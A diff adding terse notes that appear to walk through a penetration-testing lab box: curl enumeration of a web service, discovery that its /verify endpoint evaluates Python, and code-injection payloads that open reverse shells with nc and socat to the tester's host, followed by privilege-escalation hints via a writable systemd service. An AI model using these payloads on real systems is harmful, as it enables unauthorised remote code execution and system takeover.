@@ -1,0 +1,42 @@
+Foothold - u were doing well, next time try formdata/appjson params with what you can see/guess :)
+
+kali@kali:~$ curl http://192.168.120.36:50000/
+{'/generate', '/verify'}
+
+kali@kali:~$ curl http://192.168.120.36:50000/generate
+{'email@domain'}
+
+kali@kali:~$ curl http://192.168.120.36:50000/verify
+{'code'}
+
+curl -X POST --data "email=test@testing" http://192.168.120.36:50000/generate
+5a81d05b8969fd1f156969da357bcd7f9bf0430c90035f017c88f9b5249b3e9e
+
+application on port 18000 rabbit hole after getting invite code^
+
+kali@kali:~$ curl -X POST --data "code=code" http://192.168.120.36:50000/verify
+code
+
+kali@kali:~$ curl -X POST --data "code=2*2" http://192.168.120.36:50000/verify
+4
+
+curl -X POST http://192.168.167.117:50000/verify -F 'code=__import__("os").system("nc -e /bin/bash 192.168.49.167 80")'
+
+curl -X POST --data "code=os.system('socat TCP:192.168.118.8:18000 EXEC:sh')" http://192.168.120.36:50000/verify
+
+
+
+
+
+
+priv esc
+
+sudo -l for reboot
+
+lse to find python service that is writeable
+
+important REMOVE WORKING DIRECTORY IF NOT NOTHING WILL WORK (i assume setting the working directory also set the permissions of the system service)
+
+https://askubuntu.com/questions/1063153/systemd-service-working-directory-not-change-the-directory
+
+
